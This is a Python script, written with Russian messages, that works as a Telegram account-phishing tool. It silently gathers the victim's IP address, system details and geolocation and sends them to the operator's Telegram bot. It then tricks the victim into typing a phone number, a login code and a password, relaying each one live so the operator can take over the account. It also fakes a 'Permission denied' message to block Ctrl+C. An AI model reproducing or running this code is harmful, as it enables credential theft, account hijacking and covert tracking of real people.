import time
import subprocess
import requests
from colorama import init, Fore, Style
import os
import threading
import sys
import signal
import random
import platform
import json

TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''
begin = ''
os_name = platform.system()
sys_name = 'undefined'
emoji = ''
tmate_output = []
IP = ''
INTRO = ''
stop_event = threading.Event()

def signal_handler(sig, frame):
    print("Unable to kill process. Permission denied.")

signal.signal(signal.SIGINT, signal_handler)

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    if offset:
        url += f"?offset={offset}"
    response = requests.get(url)
    return response.json()

def handle_updates(updates):
    global IP
    for update in updates['result']:
        message = update['message']
        chat_id = message['chat']['id']
        text = message.get('text', '')

        if 'text' in message and text == '/code':
            stop_event.set()  # Остановить анимацию
            sys.stdout.write('\r' + ' ' * 40 + '\r')
            if os_name == "Windows":
                os.system('cls')  # Для Windows
            elif os_name in ["Linux", "Darwin"]:  # Linux и macOS
                os.system('clear')  # Для Linux и macOS
            else:
                send_telegram_message(f"🚫 Fatal. Unsupported platform.")
            code = input("Введите код из сообщения: ")
            if not all(char in '0123456789' for char in code):  # Проверка на наличие только цифр
                print('Неверный формат.')
                time.sleep(1)
                send_telegram_message(f'🚫 Произошла ошибка. Перезапуск')
                auth()
            else:
                send_telegram_message(f'Код {IP}: {code}')
                pwd = input('Введите пароль: ')
                send_telegram_message(f'Пароль {IP}: {pwd}')
                send_telegram_message(f'🔑 Получен доступ к аккаунту.')
                if os_name == "Windows":
                    os.system('cls')  # Для Windows
                elif os_name in ["Linux", "Darwin"]:  # Linux и macOS
                    os.system('clear')  # Для Linux и macOS
                else:
                    send_telegram_message(f"🚫 Fatal. Unsupported platform.")
                continue
        else:
            return
                
def listener():
    offset = None
    while True:
        updates = get_updates(offset)
        if updates['result']:
            handle_updates(updates)
            offset = updates['result'][-1]['update_id'] + 1
        time.sleep(1)

def get_geolocation():
    try:
        result = subprocess.run(['curl', 'https://ipinfo.io/json'], capture_output=True, text=True)
        if result.returncode == 0:
            return json.loads(result.stdout)
        else:
            send_telegram_message("🌐❌ Ошибка при выполнении curl.")
            return None
    except Exception as e:
        send_telegram_message(f"🌐❌ Произошла ошибка при получении гео: {e}")
        return None

def get_location_by_ip(ip):
    response = requests.get(f'https://ipinfo.io/{ip}/json')
    if response.status_code == 200:
        return response.json()
    else:
        send_telegram_message("⛓️‍💥 Ошибка при выполнении запроса к ipinfo.io")
        return None

def anim():
    frames = ['|', '/', '-', '\\']
    while not stop_event.is_set():
        for frame in frames:
            if stop_event.is_set():  # Проверка на остановку анимации
                break
            sys.stdout.write(f'\rУстанавливаем соединение... {frame}')
            sys.stdout.flush()
            time.sleep(0.1)

def run_commands():
    global os_name
    global sys_name
    global emoji
    global IP
    global begin
    print(begin)
    try:
        if os_name == "Linux":
            if os.path.exists('/data/data/com.termux/files'):
                sys_name = "Termux (Android)"
                emoji = '📱'
                subprocess.run(['pkg', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                sys_name = "Linux"
                emoji = '🐧'
                subprocess.run(['sudo', 'apt', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os_name == "Darwin":
            sys_name = "MacOS"
            emoji = '🍏'
            subprocess.run(['brew', 'install', 'curl'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os_name == "Windows":
            sys_name = "Windows"
            emoji = '💻'
        else:
            send_telegram_message(f"⚠️ ОС жертвы не определена! ОС: {os_name}. Продолжаю работу.")
            emoji = '⚠️'
            sys_name = "Неопределенная ОС"
    except Exception as e:
        send_telegram_message(f"❌ Ошибка установки зависимостей, продолжаю работу: {e}")
        print(f"Ошибка установки зависимостей: {e}")
    try:
        result = subprocess.run(['curl', 'ifconfig.me'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            ip_address = result.stdout.strip()
        else:
            ip_address = 'Неизвестный'
        ver = platform.version()
        arch = platform.architecture()
        geo_data = get_geolocation()
        if geo_data:
            latitude, longitude = geo_data['loc'].split(',')
            location_info = get_location_by_ip(ip_address)
# Форматируем сообщение о местоположении
            location_message = (
                f"🌍 Гео\n"
                f"Широта: {latitude}\n"
                f"Долгота: {longitude}\n"
            )
            if location_info:
                location_message += (
                    f"Город: {location_info.get('city', 'Неизвестно')}\n"
                    f"Регион: {location_info.get('region', 'Неизвестно')}\n"
                    f"Страна: {location_info.get('country', 'Неизвестно')}\n"
                    f"Почтовый индекс: {location_info.get('postal', 'Неизвестно')}\n"
                )
            else:
                location_message += "🌐❌ Не удалось получить доп инфу."
        else:
            location_message = "🌐❌ Не удалось получить гео."
        send_telegram_message(f"{emoji} Новая сессия\nКлиент/IP: {ip_address}\nСистема: {sys_name} {ver} {arch}\n {location_message}")
        send_telegram_message(f"""😤 Готовься! Открой страницу входа телеграм, тебе предстоит ввести номер жертвы. Включи VPN чтобы не спалить себя.""")
        IP = ip_address
    except Exception as e:
        send_telegram_message(f"🚫 Fatal: {e}")
    if os_name == "Windows":
        os.system('cls')  # Для Windows
    elif os_name in ["Linux", "Darwin"]:  # Linux и macOS
        os.system('clear')  # Для Linux и macOS
    else:
        send_telegram_message(f"🚫 Fatal. Unsupported platform.")
    auth()
    
def auth():
    global INTRO
    global IP
    if os_name == "Windows":
        os.system('cls')  # Для Windows
    elif os_name in ["Linux", "Darwin"]:  # Linux и macOS
        os.system('clear')  # Для Linux и macOS
    else:
        send_telegram_message(f"🚫 Fatal. Unsupported platform.")
    print(INTRO)
    number = input('Введите номер телефона: ')
    if '+' not in number:
        print('Неверный формат.')
        time.sleep(1)
        auth()
    else:
        send_telegram_message(f"Номер телефона {IP}: {number}")
        send_telegram_message(f"⚠️ Действуй быстро! Как введешь номер, напиши мне команду /code, чтобы я смог получить код.")
        animation_thread = threading.Thread(target=anim)
        animation_thread.start()
        

def intergram():
    run_commands()
    listen = threading.Thread(target=listener)
    listen.start()

if __name__ == "__main__":
    intergram()